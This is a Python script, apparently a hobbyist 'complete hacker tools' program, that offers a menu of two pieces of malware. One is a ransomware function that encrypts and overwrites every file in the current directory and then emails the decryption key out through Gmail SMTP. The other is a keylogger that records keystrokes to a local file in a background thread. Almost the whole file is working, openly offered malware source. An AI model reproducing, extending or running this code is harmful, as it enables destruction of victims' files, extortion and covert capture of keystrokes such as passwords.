import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet
import threading

def ransomware():
    print("You have chosen ransomware, so every file in this directory will be encrypted, and the key will be sent to you by email.")

    # Demande à l'utilisateur de saisir les informations de connexion SMTP
    smtp_server = 'smtp.gmail.com'  # you can change this default server if you want
    smtp_port = 587  # it's also by default, you can change it
    smtp_username = input("Enter your email address: ")
    smtp_password = input("Enter your SMTP password (if you use Gmail, you need to enter your application password, not your Google password): ")
    sender_email = smtp_username
    recipient_email = sender_email

    files = []

    # Parcourez tous les fichiers et dossiers du répertoire courant et ajoutez-les à la liste, à l'exception des fichiers 'ransomware.py' et 'key.key'
    for file in os.listdir():
        if file == 'hackingTools.py' or file == 'key.key':
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    # Generate key
    key = Fernet.generate_key()

    # Create key file and write the key
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

    # encrypt
    for file in files:
        with open(file, 'rb') as thefile:
            data = thefile.read()
        data_encrypted = Fernet(key).encrypt(data)
        # LOverwrite with encrypted version
        with open(file, 'wb') as encrypted_file:
            encrypted_file.write(data_encrypted)

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = recipient_email
    message['Subject'] = 'Clé de chiffrement'

    body = 'Veuillez trouver ci-joint la clé de chiffrement.'
    message.attach(MIMEText(body, 'plain'))

    attachment = MIMEText(key.decode(), 'plain')
    attachment.add_header('Content-Disposition', 'attachment', filename='key.key')
    message.attach(attachment)

    # Connect SMTP server
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, recipient_email, message.as_string())

    print('E-mail envoyé avec succès !')

def keylogger():
    print("You have chosen keylogger, so every key pressed will be saved and sent to you.")
    import keyboard

    def save_keylogs():
        while True:
            if keyboard.is_pressed("q"):
                break
            else:
                file = open("keylogger.txt", "a")
                file.write(keyboard.read_key())
                file.close()

    thread = threading.Thread(target=save_keylogs)
    thread.start()

print("Welcome to the complete hacker tools \n")
choice = int(input("Choose an option:\n1. Ransomware\n2. Keylogger\n"))

if choice == 1:
    ransomware()
elif choice == 2:
    keylogger()
else:
    print("End process")
